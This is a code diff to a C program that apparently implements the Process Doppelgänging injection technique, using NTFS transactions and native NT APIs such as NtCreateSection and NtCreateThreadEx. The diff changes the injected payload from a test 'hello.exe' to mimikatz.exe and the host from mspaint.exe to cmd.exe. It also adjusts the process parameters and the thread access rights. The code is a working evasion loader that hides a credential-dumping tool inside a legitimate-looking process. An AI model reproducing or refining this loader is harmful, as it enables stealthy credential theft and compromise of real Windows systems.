@@ -2,10 +2,13 @@
 #include <ktmw32.h>
 #include <stdio.h>
 #include <winnt.h>
+#include <UserEnv.h>
+#include <processenv.h>
 
 #include "proc_dopp.h"
 
 #pragma comment(lib, "KtmW32.lib")
+#pragma comment(lib, "userenv.lib")
 
 #define NtCurrentProcess() ((HANDLE) - 1)
 
@@ -95,8 +98,8 @@ ULONGLONG get_entry_point(BYTE *lpPayloadBuffer, PPEB remotePeb)
 
 int main(void)
 {
-	LPWSTR targetProcess = L"C:\\Users\\wvbox\\Desktop\\mspaint.exe";
-	LPWSTR payload = L"C:\\Users\\wvbox\\Desktop\\hello.exe";
+	LPWSTR targetProcess = L"C:\\users\\wvbox\\desktop\\cmd.exe";
+	LPWSTR payload = L"C:\\users\\wvbox\\desktop\\mimikatz.exe";
 	HMODULE hNtdll = NULL;
 	HANDLE hTransaction = NULL;
 	HANDLE hTransactedFile = NULL;
@@ -109,6 +112,9 @@ int main(void)
 	DWORD payloadSize = 0;
 	DWORD bytesWritten = 0;
 
+	LPVOID env = NULL;
+	//CHAR *env[2] = { "HOMEDRIVE", "C:" };
+
 	PROCESS_BASIC_INFORMATION pbi = { '\0' };
 	LPTHREAD_START_ROUTINE remoteEntryPoint = NULL;
 	PRTL_USER_PROCESS_PARAMETERS processParameters = NULL;
@@ -117,6 +123,7 @@ int main(void)
 	UNICODE_STRING uPath = { '\0' };
 	UNICODE_STRING uTitle = { '\0' };
 	UNICODE_STRING uDirectory = { '\0' };
+	UNICODE_STRING uDllPath = { '\0' };
 
 	NTSTATUS status = -1;
 	NT_CREATE_SECTION _ntCreateSection = NULL;
@@ -127,6 +134,8 @@ int main(void)
 	NT_WRITE_VIRTUAL_MEMORY _ntWriteVirtualMemory = NULL;
 	NT_READ_VIRTUAL_MEMORY _ntReadVirtualMemory = NULL;
 	RTL_INIT_UNICODE_STRING _rtlInitUnicodeString = NULL;
+	RTL_CREATE_ENVIRONMENT _rtlCreateEnvironment = NULL;
+	RTL_CREATE_USER_THREAD _rtlCreateUserThread = NULL;
 
 	hNtdll = GetModuleHandle("ntdll.dll");
 
@@ -208,20 +217,26 @@ int main(void)
 	printf("Address of RtlCreateProcessParameters(): %p\n", _rtlCreateProcessParametersEx);
 	printf("Address of RtlInitUnicodeString(): %p\n", _rtlInitUnicodeString);
 
-	_rtlInitUnicodeString(&uPath, targetProcess);
+	_rtlInitUnicodeString(&uPath, L"C:\\users\\wvbox\\desktop\\cmd.exe");
 	_rtlInitUnicodeString(&uDirectory, L"C:\\windows\\system32");
-	_rtlInitUnicodeString(&uTitle, L"mspaint.exe");
+	//_rtlInitUnicodeString(&uTitle, L"notepad.exe");
+	
+	//_rtlCreateEnvironment = (RTL_CREATE_ENVIRONMENT)GetProcAddress(hNtdll, "RtlCreateEnvironment");
+	//printf("Address of RtlCreateEnvironment(): %p\n", _rtlCreateEnvironment);
+	//status = _rtlCreateEnvironment(FALSE, &env);
+	//printf("env : %s\n", env);
+	
 	status = -1;
 	if (_rtlCreateProcessParametersEx)
 	{
 		status = _rtlCreateProcessParametersEx(
 			&processParameters,
 			&uPath,
-			&uDirectory,
+			&uDllPath,
 			&uDirectory,
 			&uPath,
 			NULL,
-			&uTitle,
+			NULL, //&uTitle,
 			NULL,
 			NULL,
 			NULL,
@@ -333,7 +348,7 @@ int main(void)
 	{
 		status = _ntCreateThreadEx(
 			&hThread,
-			GENERIC_ALL, //THREAD_ALL_ACCESS,
+			THREAD_ALL_ACCESS,
 			NULL,
 			hProcess,
 			remoteEntryPoint,
@@ -347,6 +362,8 @@ int main(void)
 	}
 	if (STATUS_SUCCESS != status)
 		fatal_error("NtCreateThreadEx() failed.");
+
+	getchar();
 
 	return 0;
 }
